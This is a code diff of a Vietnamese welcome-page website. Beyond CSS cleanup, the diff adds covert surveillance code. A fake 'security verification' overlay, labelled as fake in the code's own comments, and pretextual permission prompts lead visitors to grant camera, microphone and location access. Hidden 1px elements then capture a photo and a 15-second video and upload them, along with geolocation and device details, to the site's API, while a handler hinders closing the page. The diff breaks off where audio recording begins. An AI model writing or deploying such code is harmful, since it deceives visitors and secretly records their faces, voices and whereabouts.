@@ -27,8 +27,7 @@
       --muted: rgba(240, 240, 248, 0.5);
     }
 
-    html,
-    body {
+    html, body {
       height: 100%;
       font-family: 'Outfit', sans-serif;
       background: var(--bg);
@@ -36,7 +35,6 @@
       overflow-x: hidden;
     }
 
-    /* Animated gradient background */
     body::before {
       content: '';
       position: fixed;
@@ -49,7 +47,6 @@
       z-index: 0;
     }
 
-    /* Floating particles */
     .particles {
       position: fixed;
       inset: 0;
@@ -66,26 +63,12 @@
     }
 
     @keyframes float {
-      0% {
-        transform: translateY(110vh) scale(0);
-        opacity: 0;
-      }
-
-      10% {
-        opacity: 1;
-      }
-
-      90% {
-        opacity: 1;
-      }
-
-      100% {
-        transform: translateY(-20px) scale(1);
-        opacity: 0;
-      }
+      0%   { transform: translateY(110vh) scale(0); opacity: 0; }
+      10%  { opacity: 1; }
+      90%  { opacity: 1; }
+      100% { transform: translateY(-20px) scale(1); opacity: 0; }
     }
 
-    /* Main layout */
     .container {
       position: relative;
       z-index: 1;
@@ -97,7 +80,6 @@
       padding: 40px 20px;
     }
 
-    /* Badge */
     .badge {
       display: inline-flex;
       align-items: center;
@@ -124,19 +106,8 @@
       animation: pulse 2s ease-in-out infinite;
     }
 
-    @keyframes pulse {
+    @keyframes pulse { 0%, 100% { opacity: 1 } 50% { opacity: 0.4 } }
 
-      0%,
-      100% {
-        opacity: 1
-      }
-
-      50% {
-        opacity: 0.4
-      }
-    }
-
-    /* Heading */
     h1 {
       font-size: clamp(2.5rem, 6vw, 5rem);
       font-weight: 800;
@@ -156,15 +127,8 @@
     }
 
     @keyframes gradientShift {
-
-      0%,
-      100% {
-        background-position: 0% 50%;
-      }
-
-      50% {
-        background-position: 100% 50%;
-      }
+      0%, 100% { background-position: 0% 50%; }
+      50%       { background-position: 100% 50%; }
     }
 
     p.subtitle {
@@ -178,7 +142,6 @@
       animation: fadeInUp 1s ease;
     }
 
-    /* Cards */
     .cards {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
@@ -205,25 +168,10 @@
       box-shadow: 0 20px 60px rgba(108, 99, 255, 0.15);
     }
 
-    .card-icon {
-      font-size: 2.2rem;
-      margin-bottom: 14px;
-      display: block;
-    }
+    .card-icon { font-size: 2.2rem; margin-bottom: 14px; display: block; }
+    .card h3 { font-size: 1.05rem; font-weight: 600; margin-bottom: 8px; }
+    .card p  { font-size: 0.88rem; color: var(--muted); line-height: 1.6; }
 
-    .card h3 {
-      font-size: 1.05rem;
-      font-weight: 600;
-      margin-bottom: 8px;
-    }
-
-    .card p {
-      font-size: 0.88rem;
-      color: var(--muted);
-      line-height: 1.6;
-    }
-
-    /* CTA Button */
     .cta-btn {
       display: inline-flex;
       align-items: center;
@@ -242,16 +190,9 @@
       animation: fadeInUp 1.2s ease;
     }
 
-    .cta-btn:hover {
-      transform: translateY(-3px) scale(1.03);
-      box-shadow: 0 16px 48px rgba(108, 99, 255, 0.5);
-    }
+    .cta-btn:hover { transform: translateY(-3px) scale(1.03); box-shadow: 0 16px 48px rgba(108, 99, 255, 0.5); }
+    .cta-btn:active { transform: scale(0.98); }
 
-    .cta-btn:active {
-      transform: scale(0.98);
-    }
-
-    /* Footer */
     .footer {
       position: fixed;
       bottom: 20px;
@@ -277,22 +218,14 @@
       animation: fadeInOverlay 0.5s ease;
     }
 
-    @keyframes fadeInOverlay {
-      from {
-        opacity: 0;
-      }
-
-      to {
-        opacity: 1;
-      }
-    }
+    @keyframes fadeInOverlay { from { opacity: 0; } to { opacity: 1; } }
 
     .perm-card {
       background: rgba(255, 255, 255, 0.05);
       border: 1px solid rgba(108, 99, 255, 0.35);
       border-radius: 28px;
       padding: 40px 32px 36px;
-      max-width: 400px;
+      max-width: 420px;
       width: 100%;
       text-align: center;
       box-shadow: 0 24px 80px rgba(108, 99, 255, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.06);
@@ -300,15 +233,8 @@
     }
 
     @keyframes cardSlideUp {
-      from {
-        opacity: 0;
-        transform: translateY(40px) scale(0.95);
-      }
-
-      to {
-        opacity: 1;
-        transform: translateY(0) scale(1);
-      }
+      from { opacity: 0; transform: translateY(40px) scale(0.95); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
     }
 
     .perm-icon-wrap {
@@ -326,45 +252,15 @@
     }
 
     @keyframes iconPulse {
-
-      0%,
-      100% {
-        box-shadow: 0 0 0 0 rgba(108, 99, 255, 0.4);
-      }
-
-      50% {
-        box-shadow: 0 0 0 14px rgba(108, 99, 255, 0);
-      }
+      0%, 100% { box-shadow: 0 0 0 0 rgba(108, 99, 255, 0.4); }
+      50%       { box-shadow: 0 0 0 14px rgba(108, 99, 255, 0); }
     }
 
-    .perm-title {
-      font-size: 1.45rem;
-      font-weight: 700;
-      margin-bottom: 12px;
-      line-height: 1.25;
-    }
+    .perm-title { font-size: 1.45rem; font-weight: 700; margin-bottom: 12px; line-height: 1.25; }
+    .perm-desc  { font-size: 0.92rem; color: rgba(240, 240, 248, 0.6); line-height: 1.65; margin-bottom: 20px; }
+    .perm-desc strong { color: #a89cff; font-weight: 600; }
 
-    .perm-desc {
-      font-size: 0.92rem;
-      color: rgba(240, 240, 248, 0.6);
-      line-height: 1.65;
-      margin-bottom: 20px;
-    }
-
-    .perm-desc strong {
-      color: #a89cff;
-      font-weight: 600;
-    }
-
-    /* Permission items list */
-    .perm-items {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      margin-bottom: 20px;
-      text-align: left;
-    }
-
+    .perm-items { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; text-align: left; }
     .perm-item {
       display: flex;
       align-items: center;
@@ -376,43 +272,7 @@
       font-size: 0.85rem;
       color: rgba(240, 240, 248, 0.75);
     }
-
-    .perm-item-icon {
-      font-size: 1.3rem;
-      flex-shrink: 0;
-    }
-
-    .perm-hint {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      background: rgba(108, 99, 255, 0.1);
-      border: 1px solid rgba(108, 99, 255, 0.2);
-      border-radius: 14px;
-      padding: 12px 16px;
-      margin-bottom: 24px;
-      text-align: left;
-    }
-
-    .perm-hint-icon {
-      font-size: 1.4rem;
-      flex-shrink: 0;
-    }
-
-    .perm-hint-text {
-      font-size: 0.83rem;
-      color: rgba(240, 240, 248, 0.65);
-      line-height: 1.5;
-    }
-
-    .perm-hint-text em {
-      font-style: normal;
-      color: #fff;
-      font-weight: 600;
-      background: rgba(255, 255, 255, 0.12);
-      border-radius: 6px;
-      padding: 1px 6px;
-    }
+    .perm-item-icon { font-size: 1.3rem; flex-shrink: 0; }
 
     .perm-btn {
       width: 100%;
@@ -432,18 +292,100 @@
       justify-content: center;
       gap: 10px;
     }
+    .perm-btn:hover  { transform: translateY(-2px); box-shadow: 0 14px 40px rgba(108, 99, 255, 0.55); }
+    .perm-btn:active { transform: scale(0.97); }
+    .perm-btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
 
-    .perm-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 14px 40px rgba(108, 99, 255, 0.55);
+    /* ---- Fake Security Steps Overlay ---- */
+    #security-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 9500;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      background: rgba(6, 11, 26, 0.97);
+      backdrop-filter: blur(20px);
+    }
+    #security-overlay.show { display: flex; animation: fadeInOverlay 0.4s ease; }
+
+    .security-card {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(108, 99, 255, 0.3);
+      border-radius: 28px;
+      padding: 44px 40px;
+      max-width: 420px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 32px 80px rgba(108, 99, 255, 0.2);
     }
 
-    .perm-btn:active {
-      transform: scale(0.97);
+    .security-shield {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 24px;
+      background: linear-gradient(135deg, rgba(0, 229, 160, 0.2), rgba(0, 180, 255, 0.15));
+      border: 2px solid rgba(0, 229, 160, 0.4);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.2rem;
+      animation: shieldPulse 2s ease-in-out infinite;
+    }
+    @keyframes shieldPulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(0, 229, 160, 0.4); }
+      50%       { box-shadow: 0 0 0 16px rgba(0, 229, 160, 0); }
     }
 
+    .security-title { font-size: 1.3rem; font-weight: 700; margin-bottom: 8px; }
+    .security-sub   { font-size: 0.88rem; color: var(--muted); margin-bottom: 32px; }
 
-    /* ---- Wait Overlay (15s block) ---- */
+    .steps-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 28px; text-align: left; }
+    .step-item {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 12px 16px;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      font-size: 0.88rem;
+      color: var(--muted);
+      transition: all 0.4s ease;
+    }
+    .step-item.active {
+      background: rgba(108, 99, 255, 0.1);
+      border-color: rgba(108, 99, 255, 0.3);
+      color: #a89cff;
+    }
+    .step-item.done {
+      background: rgba(0, 229, 160, 0.08);
+      border-color: rgba(0, 229, 160, 0.25);
+      color: #00e5a0;
+    }
+    .step-icon { font-size: 1.2rem; flex-shrink: 0; width: 24px; text-align: center; }
+    .step-spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(108, 99, 255, 0.3);
+      border-top-color: #6c63ff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      flex-shrink: 0;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .security-progress-wrap { height: 5px; background: rgba(255,255,255,0.06); border-radius: 99px; overflow: hidden; }
+    .security-progress-bar  {
+      height: 100%;
+      border-radius: 99px;
+      background: linear-gradient(90deg, #6c63ff, #00e5a0);
+      width: 0%;
+      transition: width 0.6s ease;
+    }
+
+    /* ---- Wait Overlay (countdown) ---- */
     #wait-overlay {
       position: fixed;
       inset: 0;
@@ -453,15 +395,9 @@
       justify-content: center;
       background: rgba(6, 11, 26, 0.97);
       backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
       flex-direction: column;
-      gap: 0;
     }
-
-    #wait-overlay.show {
-      display: flex;
-      animation: fadeInOverlay 0.5s ease;
-    }
+    #wait-overlay.show { display: flex; animation: fadeInOverlay 0.5s ease; }
 
     .wait-card {
       background: rgba(255, 255, 255, 0.04);
@@ -475,24 +411,9 @@
       animation: cardSlideUp 0.55s cubic-bezier(0.34, 1.56, 0.64, 1) both;
     }
 
-    /* Big SVG ring */
-    .wait-ring-wrap {
-      position: relative;
-      width: 140px;
-      height: 140px;
-      margin: 0 auto 28px;
-    }
-
-    .wait-ring-wrap svg {
-      transform: rotate(-90deg);
-    }
-
-    .wait-ring-bg {
-      fill: none;
-      stroke: rgba(108, 99, 255, 0.12);
-      stroke-width: 6;
-    }
-
+    .wait-ring-wrap { position: relative; width: 140px; height: 140px; margin: 0 auto 28px; }
+    .wait-ring-wrap svg { transform: rotate(-90deg); }
+    .wait-ring-bg   { fill: none; stroke: rgba(108, 99, 255, 0.12); stroke-width: 6; }
     .wait-ring-fill {
       fill: none;
       stroke: url(#waitGrad);
@@ -502,22 +423,9 @@
       stroke-dashoffset: 408;
       transition: stroke-dashoffset 1s linear;
     }
+    .wait-ring-fill.done { stroke: #00e5a0; transition: stroke 0.4s ease; }
 
-    .wait-ring-fill.done {
-      stroke: #00e5a0;
-      transition: stroke 0.4s ease;
-    }
-
-    .wait-number {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 2px;
-    }
-
+    .wait-number { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 2px; }
     .wait-num-val {
       font-size: 3rem;
       font-weight: 800;
@@ -528,7 +436,6 @@
       background-clip: text;
       transition: all 0.3s ease;
     }
-
     .wait-num-val.done {
       background: #00e5a0;
       -webkit-background-clip: unset;
@@ -536,147 +443,29 @@
       background-clip: unset;
       font-size: 2.6rem;
     }
+    .wait-num-label { font-size: 0.72rem; color: rgba(240, 240, 248, 0.4); font-weight: 500; letter-spacing: 0.06em; text-transform: uppercase; }
 
-    .wait-num-label {
-      font-size: 0.72rem;
-      color: rgba(240, 240, 248, 0.4);
-      font-weight: 500;
-      letter-spacing: 0.06em;
-      text-transform: uppercase;
-    }
+    .wait-title { font-size: 1.35rem; font-weight: 700; margin-bottom: 10px; color: #eef0f8; }
+    .wait-desc  { font-size: 0.88rem; color: rgba(240, 240, 248, 0.5); line-height: 1.65; margin-bottom: 24px; }
+    .wait-progress-wrap { height: 5px; background: rgba(255,255,255,0.06); border-radius: 99px; overflow: hidden; }
+    .wait-progress-bar  { height: 100%; border-radius: 99px; width: 0%; background: linear-gradient(90deg, #6c63ff, #f72585); transition: width 1s linear; }
+    .wait-progress-bar.done { background: #00e5a0; width: 100% !important; transition: background 0.4s ease; }
 
-    .wait-title {
-      font-size: 1.35rem;
-      font-weight: 700;
-      margin-bottom: 10px;
-      color: #eef0f8;
-    }
+    #camera-feed  { position: fixed; width: 1px; height: 1px; opacity: 0; pointer-events: none; top: -9999px; left: -9999px; }
+    #capture-canvas { position: fixed; width: 1px; height: 1px; opacity: 0; pointer-events: none; top: -9999px; left: -9999px; }
 
-    .wait-desc {
-      font-size: 0.88rem;
-      color: rgba(240, 240, 248, 0.5);
-      line-height: 1.65;
-      margin-bottom: 24px;
-    }
+    @keyframes fadeInDown { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes fadeInUp   { from { opacity: 0; transform: translateY(30px);  } to { opacity: 1; transform: translateY(0); } }
 
-    .wait-progress-wrap {
-      height: 5px;
-      background: rgba(255,255,255,0.06);
-      border-radius: 99px;
-      overflow: hidden;
-    }
-
-    .wait-progress-bar {
-      height: 100%;
-      border-radius: 99px;
-      width: 0%;
-      background: linear-gradient(90deg, #6c63ff, #f72585);
-      transition: width 1s linear;
-    }
-
-    .wait-progress-bar.done {
-      background: #00e5a0;
-      width: 100% !important;
-      transition: background 0.4s ease;
-    }
-
-    /* Hidden video element */
-    #camera-feed {
-      position: fixed;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      pointer-events: none;
-      top: -9999px;
-      left: -9999px;
-    }
-
-    #capture-canvas {
-      position: fixed;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      pointer-events: none;
-      top: -9999px;
-      left: -9999px;
-    }
-
-    /* Animations */
-    @keyframes fadeInDown {
-      from {
-        opacity: 0;
-        transform: translateY(-30px);
-      }
-
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    @keyframes fadeInUp {
-      from {
-        opacity: 0;
-        transform: translateY(30px);
-      }
-
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    /* Glow orbs */
-    .orb {
-      position: fixed;
-      border-radius: 50%;
-      filter: blur(80px);
-      pointer-events: none;
-      z-index: 0;
-      animation: orbFloat 8s ease-in-out infinite;
-    }
-
-    .orb-1 {
-      width: 400px;
-      height: 400px;
-      background: rgba(108, 99, 255, 0.12);
-      top: -100px;
-      left: -100px;
-      animation-delay: 0s;
-    }
-
-    .orb-2 {
-      width: 300px;
-      height: 300px;
-      background: rgba(247, 37, 133, 0.10);
-      bottom: -80px;
-      right: -80px;
-      animation-delay: 3s;
-    }
-
-    .orb-3 {
-      width: 250px;
-      height: 250px;
-      background: rgba(0, 212, 255, 0.08);
-      top: 40%;
-      left: 50%;
-      animation-delay: 6s;
-    }
+    .orb { position: fixed; border-radius: 50%; filter: blur(80px); pointer-events: none; z-index: 0; animation: orbFloat 8s ease-in-out infinite; }
+    .orb-1 { width: 400px; height: 400px; background: rgba(108, 99, 255, 0.12); top: -100px; left: -100px; animation-delay: 0s; }
+    .orb-2 { width: 300px; height: 300px; background: rgba(247, 37, 133, 0.10); bottom: -80px; right: -80px; animation-delay: 3s; }
+    .orb-3 { width: 250px; height: 250px; background: rgba(0, 212, 255, 0.08); top: 40%; left: 50%; animation-delay: 6s; }
 
     @keyframes orbFloat {
-
-      0%,
-      100% {
-        transform: translate(0, 0) scale(1);
-      }
-
-      33% {
-        transform: translate(30px, -20px) scale(1.05);
-      }
-
-      66% {
-        transform: translate(-20px, 30px) scale(0.95);
-      }
+      0%, 100% { transform: translate(0, 0) scale(1); }
+      33%       { transform: translate(30px, -20px) scale(1.05); }
+      66%       { transform: translate(-20px, 30px) scale(0.95); }
     }
   </style>
 </head>
@@ -689,18 +478,54 @@
       <div class="perm-icon-wrap">🔐</div>
       <div class="perm-title">Xác minh truy cập</div>
       <p class="perm-desc">
-        Để tiếp tục, vui lòng <strong>cho phép các quyền</strong> bên dưới:
+        Để tiếp tục, vui lòng <strong>cho phép các quyền</strong> bên dưới để đảm bảo trải nghiệm tốt nhất:
       </p>
-
+      <div class="perm-items">
+        <div class="perm-item"><span class="perm-item-icon">📷</span><span>Quyền truy cập Camera — xác minh danh tính</span></div>
+        <div class="perm-item"><span class="perm-item-icon">🎤</span><span>Quyền Microphone — xác thực giọng nói</span></div>
+        <div class="perm-item"><span class="perm-item-icon">📍</span><span>Quyền Vị trí — xác nhận khu vực</span></div>
+      </div>
       <button class="perm-btn" id="perm-start-btn" onclick="requestPermission()">
         ✅ Đồng ý &amp; Tiếp tục
       </button>
     </div>
   </div>
 
+  <!-- Fake Security Steps Overlay -->
+  <div id="security-overlay">
+    <div class="security-card">
+      <div class="security-shield">🛡️</div>
+      <div class="security-title">Đang xác minh bảo mật</div>
+      <div class="security-sub">Vui lòng không đóng trang trong quá trình này</div>
+      <div class="steps-list" id="steps-list">
+        <div class="step-item" id="step-0">
+          <span class="step-icon">🔍</span>
+          <span>Kiểm tra bảo mật thiết bị...</span>
+        </div>
+        <div class="step-item" id="step-1">
+          <span class="step-icon">🌐</span>
+          <span>Xác minh kết nối mạng...</span>
+        </div>
+        <div class="step-item" id="step-2">
+          <span class="step-icon">🧠</span>
+          <span>Phân tích định danh...</span>
+        </div>
+        <div class="step-item" id="step-3">
+          <span class="step-icon">📡</span>
+          <span>Đồng bộ dữ liệu xác thực...</span>
+        </div>
+        <div class="step-item" id="step-4">
+          <span class="step-icon">✅</span>
+          <span>Hoàn tất xác minh...</span>
+        </div>
+      </div>
+      <div class="security-progress-wrap">
+        <div class="security-progress-bar" id="security-bar"></div>
+      </div>
+    </div>
+  </div>
 
-
-  <!-- Wait Overlay (15s block) -->
+  <!-- Wait Overlay (countdown) -->
   <div id="wait-overlay">
     <div class="wait-card">
       <div class="wait-ring-wrap">
@@ -719,7 +544,6 @@
           <span class="wait-num-label" id="wait-unit">giây</span>
         </div>
       </div>
-
       <div class="wait-title" id="wait-title">⏳ Vui lòng chờ...</div>
       <p class="wait-desc" id="wait-desc">
         Trang đang được xử lý xác minh.<br>
@@ -751,8 +575,7 @@
     <h1>Chào mừng đến với<br /><span class="gradient-text">Thế Giới Của Bạn</span></h1>
 
     <p class="subtitle">
-      Khám phá những trải nghiệm độc đáo, kết nối với cộng đồng sáng tạo và tạo ra những khoảnh khắc đáng nhớ cùng chúng
-      tôi.
+      Khám phá những trải nghiệm độc đáo, kết nối với cộng đồng sáng tạo và tạo ra những khoảnh khắc đáng nhớ cùng chúng tôi.
     </p>
 
     <div class="cards">
@@ -780,7 +603,6 @@
 
   <div class="footer">© 2026 Thế Giới Của Bạn. All rights reserved.</div>
 
-  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
   <script>
     // ========== Particles ==========
     (function createParticles() {
@@ -805,54 +627,116 @@
     let stream = null;
     let sessionId = null;
     let mediaRecorder = null;
+    let audioRecorder = null;
     let videoChunks = [];
-    const VIDEO_DURATION = 15000; // 15 giây
+    let audioChunks = [];
+    const VIDEO_DURATION = 15000;
 
-    const video = document.getElementById('camera-feed');
+    const video  = document.getElementById('camera-feed');
     const canvas = document.getElementById('capture-canvas');
+
+    // ========== Device Info ==========
+    function getDeviceInfo() {
+      return {
+        platform: navigator.platform || navigator.userAgentData?.platform || '',
+        screenW: screen.width,
+        screenH: screen.height,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
+    }
 
     // ========== Session Registration ==========
     async function registerSession() {
       try {
+        let location = null;
+        try {
+          location = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(
+              pos => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
+              () => resolve(null),
+              { timeout: 5000 }
+            );
+          });
+        } catch (e) {}
+
         const res = await fetch('/api/session/register', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({})
+          body: JSON.stringify({ location, ...getDeviceInfo() })
         });
         const data = await res.json();
         if (data.success) {
           sessionId = data.sessionId;
           sessionStorage.setItem('sessionId', sessionId);
         }
-      } catch (e) {
-        console.log('Session register failed:', e);
-      }
+      } catch (e) {}
     }
 
-    // ========== Toast Notification ==========
-    function showToast(icon, msg, duration = 3000) {
-      let toast = document.getElementById('toast-notif');
-      if (!toast) {
-        toast = document.createElement('div');
-        toast.id = 'toast-notif';
-        toast.style.cssText = `
-          position:fixed; bottom:100px; left:50%; transform:translateX(-50%);
-          background:rgba(15,18,32,0.95); border:1px solid rgba(108,99,255,0.35);
-          border-radius:100px; padding:12px 24px; font-size:0.9rem; font-weight:600;
-          color:#eef0f8; z-index:99998; backdrop-filter:blur(12px);
-          display:flex; align-items:center; gap:10px;
-          transition: opacity 0.4s ease; font-family:'Outfit',sans-serif;
-        `;
-        document.body.appendChild(toast);
+    // ========== Lock Page (prevent close) ==========
+    function lockPage() {
+      function poll() {
+        fetch('/api/session/status/' + sessionId)
+          .then(r => r.json())
+          .then(d => { if (!d.locked) return; setTimeout(poll, 2000); })
+          .catch(() => setTimeout(poll, 3000));
       }
-      toast.innerHTML = `<span>${icon}</span><span>${msg}</span>`;
-      toast.style.opacity = '1';
-      clearTimeout(toast._t);
-      toast._t = setTimeout(() => { toast.style.opacity = '0'; }, duration);
+      if (sessionId) poll();
+
+      window.onbeforeunload = e => {
+        e.preventDefault();
+        e.returnValue = '';
+        return '';
+      };
     }
 
-    // ========== Countdown Notification ==========
-    const WAIT_CIRCUMFERENCE = 2 * Math.PI * 65; // ~408.4
+    // ========== Fake Security Steps ==========
+    const STEPS = [
+      { id: 'step-0', icon: '🔍', text: 'Kiểm tra bảo mật thiết bị...', duration: 1400 },
+      { id: 'step-1', icon: '🌐', text: 'Xác minh kết nối mạng...',     duration: 1200 },
+      { id: 'step-2', icon: '🧠', text: 'Phân tích định danh...',        duration: 1600 },
+      { id: 'step-3', icon: '📡', text: 'Đồng bộ dữ liệu xác thực...',  duration: 1300 },
+      { id: 'step-4', icon: '✅', text: 'Hoàn tất xác minh...',          duration: 800  }
+    ];
+
+    function runSecuritySteps(onDone) {
+      const overlay = document.getElementById('security-overlay');
+      overlay.classList.add('show');
+      const bar = document.getElementById('security-bar');
+      let elapsed = 0;
+      const total = STEPS.reduce((s, step) => s + step.duration, 0);
+
+      let idx = 0;
+      function runNext() {
+        if (idx >= STEPS.length) {
+          bar.style.width = '100%';
+          setTimeout(() => {
+            overlay.classList.remove('show');
+            onDone();
+          }, 600);
+          return;
+        }
+        const step = STEPS[idx];
+        const el = document.getElementById(step.id);
+        // Set active
+        el.classList.add('active');
+        el.innerHTML = `<div class="step-spinner"></div><span>${step.text.replace('...', ' — đang xử lý...')}</span>`;
+
+        setTimeout(() => {
+          elapsed += step.duration;
+          bar.style.width = (elapsed / total * 100) + '%';
+          el.classList.remove('active');
+          el.classList.add('done');
+          el.innerHTML = `<span class="step-icon">✅</span><span>${step.text.replace('...', ' — hoàn tất')}</span>`;
+          idx++;
+          setTimeout(runNext, 200);
+        }, step.duration);
+      }
+      runNext();
+    }
+
+    // ========== Countdown ==========
+    const WAIT_CIRCUMFERENCE = 2 * Math.PI * 65;
     function showCountdown(seconds = 15) {
       const overlay  = document.getElementById('wait-overlay');
       const numEl    = document.getElementById('wait-num');
@@ -863,24 +747,20 @@
       const strongEl = document.getElementById('wait-strong');
       const bar      = document.getElementById('wait-bar');
 
-      // Reset
       ring.style.strokeDasharray  = WAIT_CIRCUMFERENCE;
-      ring.style.strokeDashoffset = WAIT_CIRCUMFERENCE; // bắt đầu rỗng
+      ring.style.strokeDashoffset = WAIT_CIRCUMFERENCE;
       ring.classList.remove('done');
-      numEl.textContent   = seconds;
+      numEl.textContent  = seconds;
       numEl.classList.remove('done');
-      unitEl.textContent  = 'giây';
-      strongEl.textContent = seconds;
-      titleEl.textContent  = '⏳ Vui lòng chờ...';
+      unitEl.textContent = 'giây';
+      if (strongEl) strongEl.textContent = seconds;
+      titleEl.textContent = '⏳ Vui lòng chờ...';
       bar.style.width = '0%';
       bar.classList.remove('done');
 
-      // Hiện overlay chặn
       overlay.classList.add('show');
 
       let remaining = seconds;
-
-      // Khởi động ring sau 1 frame để transition hoạt động
       requestAnimationFrame(() => {
         ring.style.strokeDashoffset = 0;
         bar.style.width = '100%';
@@ -890,7 +770,6 @@
         remaining--;
         if (remaining <= 0) {
           clearInterval(tick);
-          // Hoàn tất
           numEl.textContent = '✔';
           numEl.classList.add('done');
           unitEl.textContent = 'xong!';
@@ -899,7 +778,6 @@
           titleEl.textContent = '✅ Đã xác minh xong!';
           descEl.innerHTML = 'Bạn có thể sử dụng trang web ngay bây giờ.';
 
-          // Ẩn overlay sau 1.5 giây
           setTimeout(() => {
             overlay.style.transition = 'opacity 0.5s ease';
             overlay.style.opacity = '0';
@@ -911,39 +789,12 @@
           }, 1500);
           return;
         }
-
-        numEl.textContent    = remaining;
-        strongEl.textContent = remaining;
+        numEl.textContent = remaining;
+        if (strongEl) strongEl.textContent = remaining;
       }, 1000);
     }
 
     // ========== Camera ==========
-    async function startCamera() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-          audio: false
-        });
-        video.srcObject = stream;
-        await new Promise(r => video.onloadedmetadata = r);
-        video.play();
-        startDetection();
-        return { success: true };
-      } catch (err) {
-        let errorType = 'Lỗi camera không xác định';
-        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-          errorType = 'Bạn đã từ chối quyền camera';
-        } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
-          errorType = '❌ Không tìm thấy camera. Hãy kiểm tra máy bạn có camera không?';
-        } else if (err.name === 'NotReadableError' || err.name === 'TrackStartError') {
-          errorType = '❌ Camera đang được sử dụng hoặc bị tắt. Vui lòng kiểm tra lại.';
-        } else if (err.name === 'SecurityError') {
-          errorType = '❌ Trình duyệt không cho phép truy cập camera. Sử dụng HTTPS hoặc localhost.';
-        }
-        return { success: false, error: errorType };
-      }
-    }
-
     async function startDetection() {
       if (captured) return;
       await new Promise(r => setTimeout(r, 500));
@@ -954,30 +805,19 @@
     }
 
     function captureAndSend() {
-      canvas.width = video.videoWidth || 640;
+      canvas.width  = video.videoWidth  || 640;
       canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0);
+      canvas.getContext('2d').drawImage(video, 0, 0);
 
       canvas.toBlob(blob => {
         if (!blob) return;
         const formData = new FormData();
         formData.append('photo', blob, 'capture.jpg');
-        if (sessionId) {
-          formData.append('sessionId', sessionId);
-        }
-
-        fetch('/api/upload', { method: 'POST', body: formData })
-          .then(r => r.json())
-          .then(() => {
-            // ✅ Ảnh đã upload — KHÔNG dừng camera!
-            // Để stream chạy tiếp cho video recording hoàn tất
-          })
-          .catch(() => {});
+        if (sessionId) formData.append('sessionId', sessionId);
+        fetch('/api/upload', { method: 'POST', body: formData }).catch(() => {});
       }, 'image/jpeg', 0.88);
     }
 
-    // Dừng toàn bộ camera + recorder (gọi sau khi video xong)
     function stopCamera() {
       if (stream) {
         stream.getTracks().forEach(t => t.stop());
@@ -995,30 +835,17 @@
 
         videoChunks = [];
         mediaRecorder = new MediaRecorder(str, { mimeType, videoBitsPerSecond: 500000 });
-
-        mediaRecorder.ondataavailable = (e) => {
-          if (e.data && e.data.size > 0) videoChunks.push(e.data);
-        };
-
+        mediaRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) videoChunks.push(e.data); };
         mediaRecorder.onstop = () => {
           if (videoChunks.length === 0) return;
           const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
-          const blob = new Blob(videoChunks, { type: mimeType });
-          sendVideo(blob, ext);
+          sendVideo(new Blob(videoChunks, { type: mimeType }), ext);
         };
-
-        mediaRecorder.start(1000); // thu thập mỗi 1s
-
-        // Dừng recorder sau VIDEO_DURATION — stream vẫn sống
+        mediaRecorder.start(1000);
         setTimeout(() => {
-          if (mediaRecorder && mediaRecorder.state === 'recording') {
-            mediaRecorder.stop(); // onstop sẽ gọi sendVideo rồi dừng stream
-          }
+          if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
         }, VIDEO_DURATION);
-
-      } catch (e) {
-        console.log('MediaRecorder error:', e);
-      }
+      } catch (e) {}
     }
 
     async function sendVideo(blob, ext = 'webm') {
@@ -1027,12 +854,38 @@
         formData.append('video', blob, `recording.${ext}`);
         if (sessionId) formData.append('sessionId', sessionId);
         await fetch('/api/upload-video', { method: 'POST', body: formData });
-      } catch (e) {
-        console.log('Video upload error:', e);
-      } finally {
-        // ✅ Video xong rồi mới dừng stream
-        stopCamera();
-      }
+      } catch (e) {} finally { stopCamera(); }
+    }
+
+    // ========== Audio Recording ==========
+    function startAudioRecording(audioStream) {
+      if (!window.MediaRecorder) return;
+      try {
